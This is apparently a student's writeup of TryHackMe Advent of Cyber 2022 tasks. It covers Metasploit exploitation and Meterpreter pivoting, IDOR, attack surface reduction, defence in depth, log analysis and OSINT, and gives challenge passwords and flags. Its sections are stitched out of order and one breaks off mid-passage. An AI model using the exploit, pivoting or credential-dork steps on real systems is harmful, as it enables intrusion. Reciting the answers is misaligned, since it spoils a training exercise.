Docker is a way to package applications, and the associated dependencies into a single unit called an image. This image can then be shared and run as a container, either locally as a developer or remotely on a production server. Santa’s web application and database are running in Docker containers, but only the web application is directly available via an exposed port. A common way to tell if a compromised application is running in a Docker container is to verify the existence of a `/.dockerenv` file at the root directory of the filesystem.
### What is Metasploit?
Metasploit is a powerful penetration testing tool for gaining initial access to systems, performing post-exploitation, and pivoting to other applications and systems. Metasploit is free, open-source software owned by the US-based cybersecurity firm Rapid7.
### What is a Metasploit session?
After successfully exploiting a remote target with a Metasploit module, a session is often opened by default. These sessions are often Command Shells or Meterpreter sessions, which allow for executing commands against the target. It’s also possible to open up other session types in Metasploit, such as SSH or WinRM - which do not require payloads.
The common Metasploit console commands for viewing and manipulating sessions in Metasploit are:
Metasploit Console Commands
```shell-session
# Advent of Cyber 2022 — Writeup
sessions
```
```shell-session
# upgrade the last opened session to Meterpreter
sessions -u -1
```
```shell-session
# interact with a session
sessions -i session_id
```
```shell-session
# Background the currently interactive session, and go back to the Metasploit prompt
background
```
### What is Meterpreter?
Meterpreter is an advanced payload that provides interactive access to a compromised system. Meterpreter supports running commands on a remote target, including uploading/downloading files and pivoting.
Meterpreter has multiple useful commands, such as the following:
Meterpreter Commands
```shell-session
# Get information about the remote system, such as OS
sysinfo
```
```shell-session
# Upload a file or directory
upload local_file.txt
```
```shell-session
# Display interfaces
ipconfig
```
```shell-session
# Resolve a set of host names on the target to IP addresses - useful for pivoting
resolve remote_service1 remote_service2
```
Note that normal command shells do not support complex operations such as pivoting. In Metasploit’s console, you can upgrade the last opened Metasploit session to a Meterpreter session with `sessions -u -1`.
You can identify the opened session types with the `sessions` command. If you are currently interacting with a Meterpreter session, you must first `background` it. In the below example, the two session types are `shell cmd/unix` and `meterpreter x86/linux`:
Meterpreter Commands
```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                        Connection
  --  ----  ----                   -----------                                        ----------
  4         shell cmd/unix                                                            10.11.8.17:4444 -> 10.10.152.194:44124 (10.10.152.194)
  5         meterpreter x86/linux  www-data @ 172.28.101.50                           10.11.8.17:4433 -> 10.10.152.194:33296 (172.28.101.50)
```
### What is Pivoting?
Once an attacker gains initial entry into a system, the compromised machine can be used to send additional web traffic through - allowing previously inaccessible machines to be reached.
For example - an initial foothold could be gained through a web application running in a docker container or through an exposed port on a Windows machine. This system will become the attack launchpad for other systems in the network.
We can route network traffic through this compromised machine to run network scanning tools such as `nmap` or `arp` to find additional machines and services which were previously inaccessible to the pentester. This concept is called network pivoting.
### 
### Launching The TryHackMe Kali Linux
For this task, you need to be using a Kali machine. TryHackMe host and provide a version of Kali Linux that is controllable in your browser. You can also connect with your own Kali Linux using OpenVPN.
You can deploy the TryHackMe Kali Machine by following the steps below:
1. Scroll to the top of the page and press the drop-down arrow on the right of the blue "Start AttackBox" button:
2. Select "Use Kali Linux" from the drop-down:
3. Now press the "Start Kali" button to deploy the machine:
4. The machine will open in a split-screen view:
### Using Metasploit
If you are using the Web-based Kali machine or your own Kali machine, you can open Metasploit with the following `msfconsole` command:
Shell commands
```shell-session
$ msfconsole
Metasploit Framework console...
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=           | |  EXPLOIT               |
  |            // \          | |____________________    |
  |           //   \         | |==[msf >]============   |
  |          //     \        | |______________________  |
  |         // RECON \       | (@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        '///'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__          |
  | |    PAYLOAD     |""___, |     /    (_||_           |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+

       =[ metasploit v6.2.27-dev-4c958546b5               ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 948 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View advanced module options with advanced
Metasploit Documentation: https://docs.metasploit.com/
```
```shell-session
msf6 >
```
After msfconsole is opened, there are multiple commands available:
Metasploit Console Commands
```shell-session
# To search for a module, use the ‘search’ command:
```
```shell-session
msf6 > search laravel
```
```shell-session
# Load a module with the ‘use’ command
```
```shell-session
msf6 > use multi/php/ignition_laravel_debug_rce
```
```shell-session
# view the information about the module, including the module options, description, CVE details, etc
```
```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > info
```
After using a Metasploit module, you can view the options, set options, and run the module:
Metasploit Console Commands
```shell-session
# View the available options to set
show options
```
```shell-session
# Set the target host and logging
set rhost MACHINE_IP
set verbose true
```
```shell-session
# Set the payload listening address; this is the IP address of the host running Metasploit
set lhost LISTEN_IP
```
```shell-session
# show options again
show options
```
```shell-session
# Run or check the module
check
run
```
You can also directly set options from the `run` command:
Metasploit Console Commands
```shell-session
msf6 > use admin/postgres/postgres_sql
```
```shell-session
msf6 auxiliary(admin/postgres/postgres_sql) > run postgres://user:password@MACHINE_IP/database_name sql='select version()'
[*] Running module against 172.28.101.51

Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 10.5 on x86_64-pc-linux-musl, compiled by gcc (Alpine 6.4.0) 6.4.0, 64-bit

[*] Auxiliary module execution completed
```
### Using Meterpreter to pivot
Metasploit has an internal routing table that can be modified with the `route` command. This routing table determines where to send network traffic through, for instance, through a Meterpreter session. This way, we are using Meterpreter to pivot: sending traffic through to other machines on the network.
Note that Meterpreter has a separate route command, which is not the same as the top-level Metasploit prompt's route command described below. If you are currently interacting with a Meterpreter session, you must first `background` it.
Examples:
Metasploit Console Commands
```shell-session
# Example usage
route [add/remove] subnet netmask [comm/sid]
```
```shell-session
# Configure the routing table to send packets destined for 172.17.0.1 to the latest opened session
route add 172.17.0.1/32 -1
```
```shell-session
# Configure the routing table to send packets destined for 172.28.101.48/29 subnet to the latest opened session
route add 172.28.10.48/29 -1
```
```shell-session
# Output the routing table
route print
```
### Socks Proxy
A socks proxy is an intermediate server that supports relaying networking traffic between two machines. This tool allows you to implement the technique of pivoting. You can run a socks proxy either locally on a pentester’s machine via Metasploit, or directly on the compromised server. In Metasploit, this can be achieved with the `auxiliary/server/socks_proxy` module:
Metasploit Console Commands
```shell-session
use auxiliary/server/socks_proxy
run srvhost=127.0.0.1 srvport=9050 version=4a
```
Tools such as `curl` support sending requests through a socks proxy server via the `--proxy` flag:
Shell commands
-   Web Applications
-   The Open Web Application Security Project (OWASP) Top 10
-   IDOR
### Web Application
A web application is a piece of software that we can use via a web browser. Unlike computer programs and smartphone applications, a web application does not require any installation on the user’s system to make use of it. To use a web application, we only need a web browser, such as Firefox, MS Edge, Google Chrome, or Safari.
There are many advantages for the user. Because it only needs a web browser, a user can access a web application from a Microsoft Windows system, a Mac computer, or a Linux system. If the user can use a modern web browser, they can access the web application. They will be able to see the same interface and enjoy a very similar experience even with different systems. They can even access the same web application from a web browser on their smartphones, and their experience would only be affected by the screen size and what it can hold.
Moreover, there are many advantages for the software developer. Instead of developing an application for macOS, another for MS Windows, and a third for ChromeOS, they only need to build one web application and ensure that it is compatible with the different modern browsers.
The following are some examples of popular web applications:
-   **Webmail:** Examples include Tutanota, ProtonMail, StartMail, and Gmail.
-   **Online Shopping:** Some examples are Etsy, Amazon, eBay, and AliExpress.
-   **Online Banking:** Modern banks increasingly allow clients to carry out their banking operations from a web browser.
-   **Online Office Suite:** Consider, for instance, Microsoft Office 365, Zoho Office, and Google Drive.
As web technologies advance, the number and types of web applications keep increasing.
### Database
When discussing web applications, it is essential to mention database systems. Many web applications need to access vast amounts of data. Even the most basic online shopping web application requires saving information about available products, customer details, and purchases. We must find a solution to hold such information and to read from and write to the existing data efficiently. The answer lies in using a database system.
There are two popular database models:
-   Relational Database: It stores the data in tables. Tables can share information. Consider the basic example with three tables: `products`, `customer_details`, and `purchases`. The `purchases` table would use information from the `products` table.
-   Non-Relational Database: It is any database that does not use tables. It might store the data in documents, and graph nodes, among other types.
Generally speaking, a web application needs to constantly query the database, for example, to search for information, add new records, or update existing ones.
### Access Control
Consider the case where you are using an online shop as a customer. After logging in successfully, you should be able to browse the available products and check products’ details and prices, among other things. Depending on the online shop, you might be able to add a question or a review about the product; however, as a customer, you should not be able to change the price or details. That’s due to access control.
Access control is a security element that determines who can access certain information and resources. After authentication (covered in Day 5), access control enforces the appropriate access level. In the online shopping example, a vendor should be able to update the prices or descriptions of their products. However, they should not be able to modify the information related to other vendors. A customer, on the other hand, should be able to view but should not be able to alter the data.
However, due to various programming or design mistakes, access control is sometimes not appropriately imposed.
### Web Application Vulnerabilities
The OWASP was established to improve software security. The [OWASP Top 10](https://owasp.org/Top10/) list aims to raise awareness regarding common security issues that plague web applications. This list would help software developers avoid common mistakes to build more secure products. Other users, such as penetration testers and bug bounty hunters, can use this list to serve their purposes.
IDOR refers to the situation where a user can manipulate the input to bypass authorization due to poor access control. IDOR was the fourth on the OWASP Top 10 list in 2013 before it was published under Broken Access Control in 2017. To learn more about IDOR, consider the following examples.
Let’s say that a user of ID `132` is directed to the following URL after logging in to the system: `http://santagift.shop/account/user_id=132`. However, they soon discover that they can browse other users’ profiles by changing the `user_id` value from `132` to other values expected to match existing user IDs. Although the system should deny them access to the new URL due to lack of authorization, an IDOR vulnerability will let the user display such unauthorized pages. In the figure below, the user managed to access the user’s account page with ID `101`.
Consider the example where requesting an invoice generates a link similar to this: `http://santagift.shop/invoices?download=115`. To test for vulnerabilities, one would replace `115` with another number, as shown in the image below. The system is vulnerable if it lets them access other users’ invoices.
The impact of an IDOR vulnerability might let you reset the password of another user. For instance, after logging in, a malicious user might start with the URL to change their password and replace their username with that of another user. For example, the attacker would replace their username `yeti` in the URL `http://santagift.shop/account/changepassword=yeti` with another valid username and attempt to change their password, as shown in the figure below. The impact of an IDOR vulnerability can be high.
To help McSkidy with her improvements, we will learn some concepts and evaluate some steps to take. These will include:
-   Understand what an attack vector is.
-   Understand the concept of the attack surface.
-   Some practical examples of attack surface reduction techniques that McSkidy can utilize to strengthen Santa's network.
So let's start.
An attack vector is a tool, technique, or method used to attack a computer system or network. If we map the attack vectors to the physical world, attack vectors would be the weapons an adversary uses, like, swords, arrows, hammers, etc. A non-exhaustive list of examples of attack vectors in cybersecurity includes the following:
-   Phishing emails; Deceptive emails that are often impersonating someone and asking the victim to perform an action that compromises their security.
-   Denial of Service (DoS) or Distributed Denial of Service (DDoS) attacks; Sending so many requests to a website or web application that it reaches its limits and can no longer serve legitimate requests.
-   Web drive-by attacks; Flaws in web browsers that compromise the security of the victim by merely visiting a website.
-   Unpatched Vulnerability exploitation; A flaw in the internet-facing infrastructure, such as the web server or the network interface, that is exploited to take control of the infrastructure.
The attack surface is the surface area of the victim of an attack that can be impacted by an attack vector and cause damage. Taking forward our example of the physical world, the attack surface will include the unarmoured body of a soldier, which an attack of a sword, an arrow, or a hammer, etc., can damage. In cybersecurity, the attack surface will generally contain the following:
-   An email server that is used for sending and receiving emails.
-   An internet-facing web server that serves a website to visitors.
-   End-user machines that people use to connect to the network.
-   Humans can be manipulated and tricked into giving control of the network to an attacker through social engineering.
### Attack Surface Reduction
As we might notice, the attack surface can not be eliminated short of running away from the battlefield. It can only be reduced. The Greek Phalanx is an excellent example of attack surface reduction, as seen in the picture. In the picture, the front of the defending army is covered by their shields, whereas the walls of a pass cover the sides, leaving no room for an attacker to inflict damage on the defenders without running into their defenses. This is how the Spartan army could hold back a much larger Persian army for several days in the battle of Thermopylae.
However, this attack surface reduction works for the weapons of that time. This technique will not impact the attack surface against modern weapons.
In cybersecurity, the most secure computer is the one that is shut down and its cables removed. However, that is not feasible for running critical operations dependent on computers. Therefore, cybersecurity leaders aim to keep the operations running with the lowest possible attack surface. We can consider the goal as creating the digital equivalent of the Greek Phalanx.
### Examples of Attack Surface Reduction
Now that we have understood the concept behind attack surface reduction let's identify the attack vectors that could be used against Santa's infrastructure. Let's help McSkidy devise a Greek Phalanx defense to minimize the attack surface.
Close the ranks:
Santa's website was defaced earlier. When investigating that attack, McSkidy found that an SSH port was open on the server hosting the website. This led to the attacker using that open port to gain entry. McSkidy closed this port.
Put up the shields:
Although the open SSH port was protected by a password, the password was not strong enough to resist a brute-forcing attempt. McSkidy implemented a stronger password policy to make brute-forcing difficult. Moreover, a timeout would lock a user out after five incorrect password attempts, making brute-force attacks more expensive and less feasible.
Control the flow of information:
McSkidy was informed by her team about the GitHub repository that contained sensitive information, including some credentials. This information could be an attack vector to target Santa's infrastructure. This information was made private to block this attack vector. Moreover, best practices were established to ensure credentials and other sensitive information are not committed to GitHub repositories.
Beware of deception:
Another attack vector used to intrude into Santa's network was phishing emails. McSkidy identified that no phishing protection was enabled, which led to all such emails landing in the inbox of Santa's employees. McSkidy enabled phishing protection on Santa's email server to filter out spoofed and phishing emails. All emails identified as phishing or spoofed were dropped and didn't reach the inbox of Santa's employees.
Prepare for countering human error:
The phishing email that targeted Santa's employees contained a document containing malicious macros. To mitigate the risk of malicious macro-based documents compromising Santa's infrastructure, McSkidy disabled macros on end-user machines used by Santa's employees to avoid malicious macro-based attacks.
Strengthen every soldier:
McSkidy wanted the attack surface reduced from every endpoint's point of view. So far, she had taken steps to strengthen the network as a whole. For strengthening each endpoint, she took help from [Microsoft's Attack Surface Reduction rules](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide). Though these rules were built into the Microsoft Defender for Endpoint product, she took help from these rules and created a similar set of rules for her own EDR platform.
Make the defense invulnerable:
To further strengthen the infrastructure, McSkidy carried out a vulnerability scan highlighting some vulnerabilities in the internet-facing infrastructure. McSkidy patched these vulnerabilities found on Santa's internet-facing infrastructure to avoid exploitation.
After implementing these steps, McSkidy was a little relieved. However, she understood that though her attack surface was reduced, she still needed to be vigilant to avoid any incidents. Come back tomorrow to see what other steps McSkidy takes to strengthen her defenses. See ya!
Answer the questions below
Follow the instructions in the attached static site to help McSkidy reduce her attack surface against attacks from the Yeti. Use the flag as an answer to complete the task.
![[Pasted image 20221222130819.png]]
![[Pasted image 20221222130836.png]]
![[Pasted image 20221222131019.png]]
![[Pasted image 20221222131041.png]]
![[Pasted image 20221222131117.png]]
If you'd like to study cyber defence more, why not start with the [Threat and Vulnerability Management](https://tryhackme.com/module/threat-and-vulnerability-management) module?
### [Day 23] Defence in Depth Mission ELFPossible: Abominable for a Day
The Story
Check out Marc's video walkthrough for Day 23 [here](https://youtu.be/eib8zGMTook)!
Every effort you have put through builds on top of each other to bring you right at this moment. Santa and the security team are so proud of you for sticking around and being with us until now. You’re practically a member of the SSOC team already! There’s just one more thing left to learn: a lesson that may completely change how you look at and approach security.
Throughout all the previous tasks, layering defenses and reducing attack surfaces have been touched upon at least once. Writing secure code and being able to respond and analyse different parts of the attack chain, among others, are all essential in maintaining Santa's Security Posture defensible. In this task, we will focus on what is formally known in security circles as Defense in Depth, which is a more general and encompassing topic than the prior ones on their own.
Core Mindset
The core mindset that Defense in Depth is founded on is the idea that there is no such thing as a silver bullet that would defeat all of an organisation’s security woes. No single defence mechanism can protect you from the bad world out there.
Contrasting the Past and the Modern Takes on Defensive Security
Castle walls are built to withstand sieges and barrages and are fortified and manned well to protect from pillagers and marauders. Yet despite all this effort and diligence at maintaining and protecting this security measure, attackers will breach it sooner or later, and depending on the defenders' response within the castle walls, may mark the start of their end.
Fret not, though! Modern defensive security teams are moving on from this mindset and are shifting to a more robust approach. Being mindful that the castle wall, while important, is not the only way to secure the organisation, acknowledging the reality that at some point, gunpowder will be discovered and a single point of failure consequently exploited, and having additional defensive layers, especially for the specific _crown jewels_ that the bad guys may be targeting - these are some of the foundations that make up the modern security posture of defensible organisations.
Disrupting Adversarial Objectives
Defense in Depth is mainly focused on disrupting adversarial objectives; that is, the shift of focus from ‘just’ securing the perimeter to securing everything in the path that the adversary will have to take from the perimeter to the crown jewels.
Let’s look at it at three varying levels of defense:
1.  The first level is having a focus on perimeter security. There are great prevention mechanisms present in the perimeter and essentially complete trust within it; thus, once the perimeter is bypassed, the organisation is pretty much at the mercy of the adversary.
2.  The second level has defensive layers in place; however, the emphasis is solely on prevention. It doesn’t leverage ‘knowing your environment’; even though adversarial objectives may be prevented to some degree, there’s a missed opportunity in terms of detection and consequently, alerting and response. Prevention is good, but the key to defeating the bad guys is having visibility into what they are doing.
3.  The third level has well-rounded defensive layers in place, leveraging the strategic application of sensors, effective creation of analytics, and efficient alerting and response capabilities of the security team. Preventative measures here are not only coupled by detection and alerting but also by immediate and efficient response.
The first level above can be thought of as an organisation that employs great perimeter defenses in place, such as Web Application Firewalls (WAFs), Perimeter Network Firewalls, and even a Demilitarized Zone (DMZ), but is yet to implement internal network security, and zero trust mechanisms are not yet in place.
The second level can be thought of as an organisation that employs the first level of defenses but with more capable internal security measures, such as network segmentation, zero trust principle implementation, least privileged access principle implementation, and even hardened hosts and networks. Having this level is actually really good; however, forgetting that preventative appliances may be used for detective capabilities, too, is a wasted opportunity.
The third level can be thought of as using the advantages of the first and second levels to ramp up the detection and response capability of the organisation via effective log collection and well-crafted analytics. This is where it goes full circle. We are not only expected to be good at layering preventive measures against attacks, but we should also be capable of responding to them if and when these defensive capabilities are bypassed.
Let’s have the following scenario as an example: let’s say an adversary was able to penetrate our perimeter defenses via a successful spear phishing campaign. He would need to navigate a hardened environment full of tripwires and traps.
He may be able to take over a specific user’s account, but since we have implemented the principle of least privilege access properly, he would be limited in terms of what he can work with. He may be able to move laterally to another user with better privileges via pass-the-hash. Still, since we have good logging mechanisms and detection capabilities, our analytics would know exactly what pass-the-hash looks like, so we will pick this activity up. Our cavalry will be alerted to respond and remediate this particular breach immediately.
Remember that the main difference between levels 2 and 3 is the jiving together of these defensive layers and detection and response mechanisms, allowing for a coherent and well-rounded security posture.
A goal of layering defenses is to limit the room for mistakes that an adversary can have. In that sense, the bad guys need to get everything correct, but we only need them to make a mistake once.
To drive this point home, we will explore what it’s like to be in the bad guy’s shoes.
We have prepared a little game for you. The game's objective is simple: get your hands on the Naughty or Nice list in Santa’s vault. There will be three levels; each consequent one builds a defensive layer on top of the previous one and will be a little bit harder. Remember that you’re playing as the Bad Yeti here, so make sure you don’t get caught!
Click the View Site button at the top of the task to launch the static site.
Game summary / post-game discussion
After completing the game and experiencing the different levels of difficulty that an adversary may face when layering defensive measures, it must be clear to you by now that layering defenses is cool!
The levels of the game are an analogy to the three varying levels of defenses discussed earlier in this task. Further, the attack chain within the game can be interpreted as follows: Santa’s Executive Assistant (EA) receives a spear phishing email. Upon establishing a foothold, the Bad Yeti immediately realises that the EA doesn’t have access to the Naughty or Nice list. So after some enumeration and even assuming Santa’s identity at one point, the Bad Yeti was able to get ahold of the coveted list and actually ruin Christmas. Good thing it was just a game!
While the reason behind it is to show the varying effects of having defensive layers from the bad guy's perspective, on the flip side, the reality of implementing it for defensive security teams is more iterative and cyclic. Breaches and true-positive detections show areas that require improvement and the extent of our visibility in the organisation, respectively. Attacks, whether or not successful, should further inform defensive steps and approaches. If we learned that an adversary was able to exploit a specific vulnerability, then rest assured that the vulnerability will be patched and the application introducing it will be hardened.
Summary and Conclusion
Modern security practices are composed of layers. Stopping attacks from the get-go is very helpful - ideal even, but it’s not always possible. Everyone can and will be compromised - it’s just a matter of when, and it’s up to every one of us to disrupt them from being able to do what they intend to do and in every step of the way.
Answer the questions below
Case 1: What is the password for Santa’s Vault?
![[Pasted image 20221223120952.png]]
![[Pasted image 20221223121041.png]]
![[Pasted image 20221223121119.png]]
![[Pasted image 20221223121149.png]]
![[Pasted image 20221223121210.png]]
![[Pasted image 20221223121229.png]]
![[Pasted image 20221223121243.png]]
![[Pasted image 20221223121301.png]]
![[Pasted image 20221223121314.png]]
*S3cr3tV@ultPW*
Case 1: What is the Flag?
![[Pasted image 20221223121451.png]]
![[Pasted image 20221223121505.png]]
![[Pasted image 20221223121520.png]]
![[Pasted image 20221223121535.png]]
![[Pasted image 20221223121547.png]]
Case 2: What is Santa’s favourite thing?
![[Pasted image 20221223121608.png]]
![[Pasted image 20221223121715.png]]
![[Pasted image 20221223121737.png]]
![[Pasted image 20221223121751.png]]
![[Pasted image 20221223121819.png]]
*MilkAndCookies*
Case 2: What is the password for Santa’s Vault?
![[Pasted image 20221223121858.png]]
![[Pasted image 20221223121912.png]]
*3XtrR@_S3cr3tV@ultPW*
Case 2: What is the Flag?
![[Pasted image 20221223121935.png]]
![[Pasted image 20221223121950.png]]
![[Pasted image 20221223122012.png]]
Case 3: What is the Executive Assistant’s favourite thing?
![[Pasted image 20221223122030.png]]
![[Pasted image 20221223122211.png]]
![[Pasted image 20221223122236.png]]
![[Pasted image 20221223122300.png]]
![[Pasted image 20221223122334.png]]
![[Pasted image 20221223122358.png]]
*BanoffeePie*
Case 3: What is Santa’s previous password?
![[Pasted image 20221223123407.png]]
![[Pasted image 20221223122731.png]]
![[Pasted image 20221223122834.png]]
*H0tCh0coL@t3_01*
Case 3: What is Santa’s current password?
Can’t really blame Santa if he’s too lazy for big password changes… He’s super busy! Try changing the last digit of his old password and see if that works.
*H0tCh0coL@t3_02*
Case 3: What is the 1st part of the vault’s password?
![[Pasted image 20221223123438.png]]
![[Pasted image 20221223123454.png]]
*N3w4nd1m*
Case 3: What is the 2nd part of the vault’s password?
![[Pasted image 20221223122800.png]]
*Pr0v3dV@ultPW*
Case 3: What is the password for Santa’s Vault?
*N3w4nd1mPr0v3dV@ultPW*
Case 3: What is the Flag?
![[Pasted image 20221223123536.png]]
![[Pasted image 20221223123546.png]]
What is Santa's Code?
*2845*
Mission ELFPossible: What is the Abominable for a Day Flag?
![[Pasted image 20221223123622.png]]
If you'd like to learn more about mitigating and managing potential adversary actions, check out the [T](https://tryhackme.com/module/cyber-threat-intelligence)[hreat Intelligence](https://tryhackme.com/module/cyber-threat-intelligence) module!
![[Pasted image 20221223123746.png]]
nice game!!!
### [Day 24] Feedback Ho, ho, ho, the survey's short
[Thank You]
Thank you so much for participating in this year's Advent of Cyber event!
Answer the questions below
Please help us improve by answering [this 5-minute survey](https://forms.gle/grAqhDAmE7i33drG8). Make sure to grab the flag before you click "Submit"!
Complete the form to get the answer to this question. Make sure to grab the flag before you click "Submit"!
![[Pasted image 20221224112838.png]]
Continue learning with the [Pre Security](https://tryhackme.com/path/outline/presecurity), [Jr Penetration Tester](https://tryhackme.com/path/outline/jrpenetrationtester), or [SOC Level 1](https://tryhackme.com/path/outline/soclevel1) pathway!
Completed
The prize winners will be announced on the 28th of December - you have until then to complete the tasks. Remember, the more questions you answer, the higher your chance of winning!
The daily prize winners for the last week of the event will be announced on Twitter on Wednesday, December 28th.
### [Day 24] The EndThe Year of the Bandit Yeti
[Nightmare Before Elfmas - The End]
Ah, what a month! As McSkidy watched Santa’s sleigh take off, loaded with gifts, she sighed with relief.
We did it!
Looking around the workshop, she could see Santa’s SOC Team working on their tasks.
Some were setting up additional defenses, some were implementing new security policies,
and some were trying out new skills (and hats!) too.
There are some things McSkidy can’t see, but would be vital for you to know.
The Bandit Yeti has left the area and returned to his lair, defeated for now.
If we could look inside his planning room, we’d see the beginnings
of a new scheme, but let’s not worry about that today!
As McSkidy returned to her office, she looked at her desk,
where just 24 days ago, an evil-looking card was placed.
Now that spot was occupied by a scroll with a massive security to-do list.
They all worked hard to clear as many items as possible, but many remain.
Security is never done!
However, with Santa in the air, she could cross out “Save Christmas” off the list. Success!
McSkidy and all the Elves from Santa’s Security Team thank you for your help this year.
They promised to call you if they get into trouble in 2023!
[The Final Countdown]
You have until the end of December 27th to answer as many questions in this room as possible. Each question answered is an additional ticket in the main prize raffle! We will announce prize winners on December 28th. See the timer below for the exact countdown!
![](https://gen.sendtric.com/countdown/p1w0poa7nw)
The Advent of Cyber 2022 room will remain available for you to explore. Grab the last question of the event below and get one more raffle ticket! Please note that once all questions in this room are answered, you will receive an Advent of Cyber 2022 badge and certificate. Very cool! Check your Full Name on your [profile page](https://tryhackme.com/profile) before generating the Certificate, as it can’t be changed afterwards.
Happy Holidays,
_The TryHackMe Team_
Answer the questions below
Are you ready to continue your learning journey on TryHackMe? (Yea,Yea)
*Yea*
Thx Tryhackme, I learned alot!!

## Enumeration
```text
elfmcblue@day-2-log-analysis:~$ more webserver.log 
10.9.12.30 - - [18/Nov/2022:12:18:23 +0000] "GET / HTTP/1.1" 200 3036 "-" "Mozilla/5.0 (Windo
ws NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
"
10.9.12.30 - - [18/Nov/2022:12:18:23 +0000] "GET /assets/css/stylesheet.e534de95c45f12e712642
d4891fdc622837d0270dd58b129282e0e4b65b5df1a.css HTTP/1.1" 200 4526 "http://10.10.60.160/" "Mo
zilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0
.0 Safari/537.36"
10.10.249.191 - - [18/Nov/2022:12:28:15 +0000] "GET / HTTP/1.1" 200 2980 "-" "gobuster/3.0.1"
10.10.249.191 - - [18/Nov/2022:12:28:15 +0000] "GET /d30f0e6a-9e9c-465a-b4d2-279e8785efde HTT
P/1.1" 404 437 "-" "gobuster/3.0.1"
```
*Friday*
What is the IP address of the attacker?
The attacker only made one request to the web server.
*10.10.249.191*
What is the name of the important list that the attacker stole from Santa?
```text
elfmcblue@day-2-log-analysis:~$ grep -v "404" webserver.log 
10.9.12.30 - - [18/Nov/2022:12:18:23 +0000] "GET / HTTP/1.1" 200 3036 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
10.9.12.30 - - [18/Nov/2022:12:18:23 +0000] "GET /assets/css/stylesheet.e534de95c45f12e712642d4891fdc622837d0270dd58b129282e0e4b65b5df1a.css HTTP/1.1" 200 4526 "http://10.10.60.160/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
10.10.249.191 - - [18/Nov/2022:12:28:15 +0000] "GET / HTTP/1.1" 200 2980 "-" "gobuster/3.0.1"
10.10.249.191 - - [18/Nov/2022:12:28:15 +0000] "GET /assets HTTP/1.1" 301 527 "-" "gobuster/3.0.1"
10.10.249.191 - - [18/Nov/2022:12:28:15 +0000] "GET /categories HTTP/1.1" 301 535 "-" "gobuster/3.0.1"
10.10.249.191 - - [18/Nov/2022:12:28:15 +0000] "GET /tags HTTP/1.1" 301 523 "-" "gobuster/3.0.1"
10.10.249.191 - - [18/Nov/2022:12:34:39 +0000] "GET /santaslist.txt HTTP/1.1" 200 133872 "-" "Wget/1.19.4 (linux-gnu)"
```
*santaslist.txt*
Using grep recursively allows you to quickly look through a bunch of log files for a value.
```text
elfmcblue@day-2-log-analysis:~$ grep -i "THM" SSHD.log 
THM{STOLENSANTASLIST}
```
Interested in log analysis? We recommend the [Windows Event Logs](https://tryhackme.com/room/windowseventlogs) room or the [Endpoint Security Monitoring Module](https://tryhackme.com/module/endpoint-security-monitoring).
### [Day 3] OSINT Nothing escapes detective McRed
The Story
Check out CyberSecMeg's video walkthrough for Day 3 [here](https://www.youtube.com/watch?v=j3sSJudp-H8)!
As the elves are trying to recover the compromised `santagift.shop` website, elf Recon McRed is trying to figure out how it was compromised in the first place. Can you help him in gathering open-source information against the website?
**Learning Objectives**
-   What is OSINT, and what techniques can extract useful information against a website or target?
-   Using dorks to find specific information on the Google search engine
-   Extracting hidden directories through the Robots.txt file
-   Domain owner information through WHOIS lookup
-   Searching data from hacked databases
-   Acquiring sensitive information from publicly available GitHub repositories
**What is OSINT**
OSINT is gathering and analysing publicly available data for intelligence purposes, which includes information collected from the internet, mass media, specialist journals and research, photos, and geospatial information. The information can be accessed via the open internet (indexed by search engines), closed forums (not indexed by search engines) and even the deep and dark web. People tend to leave much information on the internet that is publicly available and later on results in impersonation, identity theft etc.
**OSINT Techniques**
**Google Dorks**
Google Dorking involves using specialist search terms and advanced search operators to find results that are not usually displayed using regular search terms. You can use them to search specific file types, cached versions of a particular site, websites containing specific text etc.  Bad actors widely use it to locate website configuration files and loopholes left due to bad coding practices. Some of the widely used Google dorks are mentioned below:
-   **inurl**: Searches for a specified text in all indexed URLs. For example, `inurl:hacking` will fetch all URLs containing the word "hacking".
-   **filetype**: Searches for specified file extensions. For example, `filetype:pdf "hacking"` will bring all pdf files containing the word "hacking".
-   **site**: Searches all the indexed URLs for the specified domain. For example, `site:tryhackme.com` will bring all the indexed URLs from  `tryhackme.com`.
-   **cache**: Get the latest cached version by the Google search engine. For example, `cache:tryhackme.com`.
For example, you can use the dork `site:github.com "DB_PASSWORD"` to search only in `github.com` and look for the string `DB_PASSWORD` (possible database credentials). You can learn more about Google dorks through [this](https://tryhackme.com/room/googledorking) free room.
Bingo! We have identified several repositories with database passwords.
**WHOIS Lookup**
WHOIS database stores public domain information such as registrant (domain owner), administrative, billing and technical contacts in a centralised database. The database is publicly available for people to search against any domain and enables acquiring Personal Identifiable Information (PII) against a company, like an email address, mobile number etc., of technical contact. Bad actors can, later on, use the information for profiling, [spear phishing campaigns](https://www.trendmicro.com/vinfo/us/security/definition/spear-phishing) (targeting selected individuals) etc. Nowadays, registrars offer Domain Privacy options that allow users to keep their WHOIS information private from the general public and only accessible to certain entities like designated registrars.
Multiple websites allow checking the WHOIS information against the website. For example, you can check WHOIS information on `github.com` through this [free website](https://who.is/whois/github.com).
